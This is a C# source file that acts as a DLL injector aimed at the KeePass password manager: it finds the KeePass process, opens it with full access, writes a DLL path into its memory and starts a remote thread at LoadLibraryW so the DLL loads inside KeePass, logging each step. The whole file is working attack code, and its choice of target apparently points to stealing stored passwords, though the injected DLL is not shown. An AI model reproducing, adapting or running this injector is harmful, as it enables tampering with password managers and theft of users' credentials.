using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Inj
{
    public class I
    {
        [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
        [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
        [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, ref uint w);
        [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr sa, uint ss, IntPtr fn, IntPtr p, uint f, ref uint id);
        [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
        [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
        [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);

        public static int Run(string dllPath)
        {
            string log = Path.Combine(Path.GetDirectoryName(dllPath), "inj_log.txt");
            try
            {
                Process[] procs = Process.GetProcessesByName("KeePass");
                if (procs.Length == 0) { File.WriteAllText(log, "no keepass"); return 1; }
                int pid = procs[0].Id;
                File.WriteAllText(log, "pid:" + pid + "\r\n");

                IntPtr h = OpenProcess(0x1FFFFF, false, pid);
                if (h == IntPtr.Zero) { File.AppendAllText(log, "open fail\r\n"); return 2; }
                File.AppendAllText(log, "open ok\r\n");

                byte[] bytes = Encoding.Unicode.GetBytes(dllPath + "\0");
                IntPtr mem = VirtualAllocEx(h, IntPtr.Zero, (uint)bytes.Length, 0x3000, 0x04);
                if (mem == IntPtr.Zero) { File.AppendAllText(log, "alloc fail\r\n"); return 3; }
                File.AppendAllText(log, "alloc:" + mem + "\r\n");

                uint written = 0;
                WriteProcessMemory(h, mem, bytes, (uint)bytes.Length, ref written);
                File.AppendAllText(log, "wrote:" + written + "\r\n");

                IntPtr k32 = GetModuleHandle("kernel32");
                IntPtr ll = GetProcAddress(k32, "LoadLibraryW");
                File.AppendAllText(log, "ll:" + ll + "\r\n");

                uint tid = 0;
                IntPtr thr = CreateRemoteThread(h, IntPtr.Zero, 0, ll, mem, 0, ref tid);
                if (thr == IntPtr.Zero) { File.AppendAllText(log, "thread fail\r\n"); return 4; }
                File.AppendAllText(log, "thread ok\r\n");

                WaitForSingleObject(thr, 15000);
                File.AppendAllText(log, "done\r\n");
                return 0;
            }
            catch (Exception ex)
            {
                File.WriteAllText(log, "ex:" + ex.ToString());
                return 99;
            }
        }
    }
}
